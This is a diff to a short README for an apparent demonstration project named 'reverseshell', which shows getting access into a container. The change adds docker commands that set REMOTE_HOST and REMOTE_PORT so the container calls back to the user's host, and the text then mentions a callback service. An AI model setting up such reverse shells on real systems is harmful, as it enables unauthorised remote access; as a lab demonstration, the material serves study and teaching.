@@ -1,10 +1,10 @@
 # README.md
 Demonstrates getting access into a container
 
-Run the stupid webserver
+Run the stupid webserver.  Retrieve your host ip address and replace. 
 ```
 docker build -t reverseshell . 
-docker run --rm -p 8080:8080 reverseshell
+docker run --env REMOTE_HOST=192.168.1.238 --env REMOTE_PORT=8888 --rm -p 8080:8080 reverseshell
 ```
 
 Run the callback service
